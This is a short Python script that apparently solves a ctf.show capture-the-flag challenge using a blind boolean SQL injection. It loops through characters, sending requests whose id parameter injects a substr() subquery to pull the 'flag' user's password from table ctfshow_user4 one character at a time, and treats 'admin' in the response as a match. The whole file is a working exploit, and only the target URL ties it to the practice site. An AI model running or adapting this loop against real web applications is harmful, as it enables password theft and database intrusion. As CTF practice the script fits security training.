import requests

url = "http://57496c50-1b0d-40de-ac22-501e93a1ddbd.chall.ctf.show/api/v4.php"
dict = "0123456789abcdefghijklmnopqrstuvwxyz{}-"
flag = ""
for i in range(1, 50):
    for j in dict:
        # 需要知道表和列，要查询的字段名
        payload = f"?id=1' and substr((select password from ctfshow_user4 where username=\"flag\"),{i},1)=\"{j}\"--+"
        gloal = url + payload
        res = requests.get(url=gloal)
        if 'admin' in res.text:  # 查询成功的标志
            flag += j
            print(flag)
            break
